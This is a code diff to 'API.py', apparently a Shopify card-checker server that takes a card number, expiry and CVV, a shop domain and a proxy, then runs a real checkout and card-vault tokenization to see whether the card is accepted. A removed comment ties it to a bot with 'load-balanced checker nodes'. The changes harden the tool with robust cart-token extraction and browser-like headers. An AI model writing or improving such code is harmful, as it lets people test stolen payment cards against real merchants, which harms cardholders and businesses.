@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 # ═══════════════════════════════════════════════════════════════════════════
-# API.py — Shopify Checkout API Server
-# Compatible with bot.py (load-balanced checker nodes)
+# API.py — Shopify Checkout API Server (Robust Version)
 # ═══════════════════════════════════════════════════════════════════════════
 import os
 import re
@@ -15,7 +14,6 @@ import asyncio
 import traceback
 from logging.handlers import RotatingFileHandler
 from concurrent.futures import ThreadPoolExecutor
-from urllib.parse import urlparse
 
 import requests
 from aiohttp import web
@@ -33,28 +31,24 @@ VAULT_ENDPOINTS = [
     "https://deposit.us.shopifycs.com/sessions",
 ]
 
-# ═══ LOGGING SETUP ═══
+# ═══ LOGGING ═══
 _LOG_FMT = logging.Formatter(
     "%(asctime)s │ %(levelname)-7s │ %(name)s │ %(message)s",
     datefmt="%Y-%m-%d %H:%M:%S",
 )
-
 _root = logging.getLogger()
 _root.setLevel(logging.INFO)
 
-# Console
 _console = logging.StreamHandler(sys.stdout)
 _console.setFormatter(_LOG_FMT)
 _root.addHandler(_console)
 
-# Rotating file — all logs
 _file_all = RotatingFileHandler(
     "api.log", maxBytes=10 * 1024 * 1024, backupCount=5, encoding="utf-8"
 )
 _file_all.setFormatter(_LOG_FMT)
 _root.addHandler(_file_all)
 
-# Rotating file — errors only
 _file_err = RotatingFileHandler(
     "api_error.log", maxBytes=5 * 1024 * 1024, backupCount=3, encoding="utf-8"
 )
@@ -64,22 +58,18 @@ _root.addHandler(_file_err)
 
 log = logging.getLogger("api")
 
+
 # ═══ PROXY PARSER ═══
 def parse_proxy(p):
-    """Return requests-compatible proxy string, or None."""
     if not p:
         return None
     p = p.strip()
     if not p:
         return None
-
     if p.startswith(("socks5://", "socks5h://", "socks4://", "http://", "https://")):
         return p
-
     if "@" in p:
-        # user:pass@ip:port
         return f"http://{p}"
-
     parts = p.split(":")
     if len(parts) == 4:
         ip, port, user, pw = parts
@@ -89,7 +79,7 @@ def parse_proxy(p):
     return None
 
 
-# ═══ GRAPHQL QUERIES ═══
+# ═══ GRAPHQL QUERIES (unchanged) ═══
 PROPOSAL_QUERY = (
     "query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
     "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
@@ -181,9 +171,50 @@ def addr():
     }
 
 
+# ═══ HELPER: fetch cart token robustly ═══
+def _get_cart_token(session, site, add_response_text=""):
+    """
+    Try multiple ways to obtain cart token.
+    Returns token string or None.
+    """
+    # Method 1: /cart.js
+    for attempt in range(3):
+        try:
+            r = session.get(f"https://{site}/cart.js", timeout=15)
+            if r.status_code == 200:
+                try:
+                    j = r.json()
+                    tok = j.get("token")
+                    if tok:
+                        return tok
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        time.sleep(0.5)
+
+    # Method 2: parse from /cart/add.js response body
+    if add_response_text:
+        for pat in [
+            r'"token"\s*:\s*"([^"]+)"',
+            r'"cart_token"\s*:\s*"([^"]+)"',
+            r"cart_token=([^;\"']+)",
+        ]:
+            m = re.search(pat, add_response_text)
+            if m:
+                return m.group(1)
+
+    # Method 3: parse from cookie jar
+    for cookie in session.cookies:
+        if cookie.name in ("cart", "cart_sig", "cart_token", "cart_currency"):
+            if cookie.name == "cart" and cookie.value:
+                return cookie.value
+
+    return None
+
+
 # ═══ CHECKOUT FLOW ═══
 def checkout_sync(cc_raw, site_raw, proxy_raw):
-    """Full checkout. Returns dict with Response/Price/Gateway/Status."""
     out = {
         "Response": "Unknown Error",
         "Price": "-",
@@ -204,10 +235,18 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
         yyyy = "20" + yyyy
 
     site = re.sub(r"^https?://", "", site_raw.strip()).rstrip("/")
+    # strip any path
+    site = site.split("/")[0]
+
     proxy_url = parse_proxy(proxy_raw) if proxy_raw else None
 
     s = requests.Session()
-    s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"})
+    s.headers.update({
+        "User-Agent": UA,
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+    })
     if proxy_url:
         s.proxies.update({"http": proxy_url, "https": proxy_url})
 
@@ -221,7 +260,7 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
         except Exception as e:
             out["Response"] = f"Site Error: {type(e).__name__}"
             out["Status"] = "Site Error"
-            log.warning(f"[{site}] products.json failed: {type(e).__name__}")
+            log.warning(f"[{site}] products.json: {type(e).__name__}")
             return out
 
         if r.status_code != 200:
@@ -258,6 +297,7 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
         out["Price"] = f"{valid[0]['price']:.2f}"
 
         # ── 2. Add to cart ──
+        add_resp_text = ""
         try:
             r = s.post(
                 f"https://{site}/cart/add.js",
@@ -266,26 +306,30 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
                     "Content-Type": "application/x-www-form-urlencoded",
                     "Referer": f"https://{site}/",
                     "Origin": f"https://{site}",
+                    "X-Requested-With": "XMLHttpRequest",
                 },
                 data={"id": str(vid), "quantity": "1", "form_type": "product"},
                 timeout=15,
             )
+            add_resp_text = r.text or ""
             if r.status_code != 200:
                 out["Response"] = f"Failed to create checkout: cart HTTP {r.status_code}"
                 out["Status"] = "Site Error"
+                log.debug(f"[{site}] cart/add.js {r.status_code}: {add_resp_text[:200]}")
                 return out
         except Exception as e:
             out["Response"] = f"Site Error: {type(e).__name__}"
             out["Status"] = "Site Error"
             return out
 
-        # ── 3. Cart token ──
-        try:
-            r = s.get(f"https://{site}/cart.js", timeout=15)
-            cart_token = r.json().get("token")
-        except Exception:
+        # ── 3. Cart token (robust) ──
+        cart_token = _get_cart_token(s, site, add_resp_text)
+        if not cart_token:
             out["Response"] = "Site Error: no cart token"
             out["Status"] = "Site Error"
+            log.warning(
+                f"[{site}] no cart token — cookies={[c.name for c in s.cookies]}"
+            )
             return out
 
         # ── 4. Init checkout ──
@@ -333,7 +377,6 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
             out["Status"] = "Site Error"
             return out
 
-        # Extract session token
         session_token = None
         for pat in [
             r'"serializedSessionToken"\s*:\s*"([^"]+)"',
@@ -375,7 +418,7 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
             "Accept": "application/json",
             "Content-Type": "application/json",
             "Origin": f"https://{site}",
-            "Referer": f"https://{site}/",
+            "Referer": final_url,
             "X-Checkout-One-Session-Token": session_token,
             "X-Checkout-Web-Deploy-Stage": "production",
             "X-Checkout-Web-Server-Handling": "fast",
@@ -476,13 +519,11 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
             try:
                 r = s.post(gql_url, headers=gql_headers, json=proposal_payload(), timeout=20)
                 j = r.json()
-            except Exception as e:
-                log.debug(f"[{site}] proposal attempt {attempt}: {type(e).__name__}")
+            except Exception:
                 time.sleep(1)
                 continue
 
             if j.get("errors"):
-                log.debug(f"[{site}] proposal GQL errors: {j['errors']}")
                 break
 
             negotiate = j.get("data", {}).get("session", {}).get("negotiate", {})
@@ -510,7 +551,6 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
             out["Status"] = "Site Error"
             return out
 
-        # Call #2
         try:
             r = s.post(
                 gql_url, headers=gql_headers,
@@ -570,8 +610,8 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
                     if pid:
                         payment_session_id = pid
                         break
-            except Exception as e:
-                log.debug(f"[{site}] vault {url}: {type(e).__name__}")
+            except Exception:
+                pass
 
         if not payment_session_id:
             out["Response"] = "Failed to tokenize card"
@@ -764,12 +804,6 @@ executor = ThreadPoolExecutor(max_workers=WORKERS)
 
 
 async def handle_check(request):
-    """
-    Compatible with bot.py:
-      GET /shopify?site=<site>&cc=<cc|mm|yyyy|cvv>&proxy=<optional>
-    Also supports:
-      GET /Shopify?...
-    """
     cc    = (request.query.get("cc")    or "").strip()
     site  = (request.query.get("site")  or "").strip()
     proxy = (request.query.get("proxy") or "").strip() or None
@@ -809,7 +843,6 @@ async def handle_health(request):
         "status": "ok",
         "service": "nomi-api",
         "workers": WORKERS,
-        "active_threads": len(executor._threads) if hasattr(executor, "_threads") else 0,
     })
 
 
@@ -821,42 +854,15 @@ async def handle_root(request):
     })
 
 
-async def handle_404(request):
-    return web.json_response(
-        {"error": "Not Found", "path": request.path},
-        status=404,
-    )
-
-
 def make_app():
     app = web.Application(client_max_size=1024 * 256)
     app.router.add_get("/", handle_root)
     app.router.add_get("/health", handle_health)
-    # Case-insensitive route registration
     app.router.add_get("/shopify", handle_check)
     app.router.add_get("/Shopify", handle_check)
     return app
 
 
-# ═══ GRACEFUL SHUTDOWN ═══
-def _install_signal_handlers(loop):
-    def _shutdown():
-        log.warning("Shutdown signal received — stopping server...")
-        try:
-            executor.shutdown(wait=False)
-        except Exception:
-            pass
-        loop.stop()
-
-    for sig in (signal.SIGINT, signal.SIGTERM):
-        try:
-            loop.add_signal_handler(sig, _shutdown)
-        except NotImplementedError:
-            # Windows fallback
-            signal.signal(sig, lambda *_: _shutdown())
-
-
-# ═══ MAIN ═══
 if __name__ == "__main__":
     log.info("═" * 60)
     log.info(f" nomi-api starting on http://{HOST}:{PORT}")
@@ -865,9 +871,6 @@ if __name__ == "__main__":
     log.info("═" * 60)
 
     app = make_app()
-
-    # aiohttp web.run_app handles loop creation internally.
-    # We attach signal handlers by patching run_app's loop creation.
     try:
         web.run_app(
             app,
